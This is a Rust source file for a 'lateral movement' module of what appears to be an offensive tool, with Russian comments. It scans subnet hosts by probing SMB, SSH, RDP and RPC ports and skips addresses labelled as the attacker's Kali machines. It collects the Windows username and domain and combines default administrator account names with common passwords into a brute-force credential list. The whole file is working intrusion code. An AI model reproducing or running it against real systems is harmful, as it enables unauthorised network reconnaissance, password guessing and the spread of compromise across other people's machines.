// src/lateral_movement.rs
use std::net::{TcpStream, SocketAddr};
use std::time::Duration;
use log::info;

pub struct LateralMovement;

impl LateralMovement {
    // Обнаружение хостов в сети
    pub fn discover_hosts(network: &str, start: u8, end: u8) -> Vec<String> {
        let mut hosts = Vec::new();
        let network_parts: Vec<&str> = network.split('.').collect();
        
        if network_parts.len() != 3 {
            return hosts;
        }
        
        let base = format!("{}.{}.{}", network_parts[0], network_parts[1], network_parts[2]);
        
        for i in start..=end {
            let ip = format!("{}.{}", base, i);
            
            // Пропускаем определенные IP адреса
            if Self::should_skip_ip(&ip) {
                continue;
            }
            
            // Проверяем доступность
            if Self::is_host_alive(&ip) {
                info!("Discovered active host: {}", ip);
                hosts.push(ip);
            }
        }
        
        hosts
    }
    
    fn should_skip_ip(ip: &str) -> bool {
        // Пропускаем Kali и другие важные хосты
        if ip.starts_with("192.168.53.") {
            if let Some(last_part) = ip.split('.').last() {
                if let Ok(num) = last_part.parse::<u8>() {
                    return num >= 1 && num <= 10;
                }
            }
        }
        false
    }
    
    fn is_host_alive(ip: &str) -> bool {
        // Быстрая проверка ping (ICMP не всегда доступен, проверяем порты)
        let ports = [445, 22, 3389, 135, 139];
        for &port in &ports {
            if Self::check_port(ip, port, 200) {
                return true;
            }
        }
        false
    }
    
    pub fn check_port(ip: &str, port: u16, timeout_ms: u64) -> bool {
        let addr: SocketAddr = format!("{}:{}", ip, port)
            .parse()
            .unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap());
        
        match TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms)) {
            Ok(_) => true,
            Err(_) => false,
        }
    }
    
    // Получение учетных данных из системы (Windows only)
    #[cfg(target_os = "windows")]
    pub fn harvest_credentials() -> Vec<(String, String, String)> {
        use std::process::Command;
        
        let mut credentials = Vec::new();
        
        // Базовая информация о пользователе
        let output = Command::new("cmd")
            .args(&["/c", "echo %USERNAME% & echo %USERDOMAIN%"])
            .output();
        
        if let Ok(result) = output {
            let stdout = String::from_utf8_lossy(&result.stdout);
            let lines: Vec<&str> = stdout.lines().collect();
            
            if lines.len() >= 2 {
                let username = lines[0].trim().to_string();
                let domain = lines[1].trim().to_string();
                
                credentials.push((username.clone(), "".to_string(), domain));
            }
        }
        
        // Добавляем стандартные учетные записи для попытки
        credentials.push(("Administrator".to_string(), "".to_string(), "".to_string()));
        credentials.push(("administrator".to_string(), "".to_string(), "".to_string()));
        credentials.push(("admin".to_string(), "".to_string(), "".to_string()));
        credentials.push(("user".to_string(), "".to_string(), "".to_string()));
        credentials.push(("suser".to_string(), "".to_string(), "".to_string()));

        
        // Пробуем общие пароли
        let common_passwords = vec!["", "password", "123456", "admin", "P@ssw0rd", "resu"];
        let mut expanded_creds = Vec::new();
        
        for (user, _, domain) in credentials {
            for pass in &common_passwords {
                expanded_creds.push((user.clone(), pass.to_string(), domain.clone()));
            }
        }
        
        expanded_creds
    }
}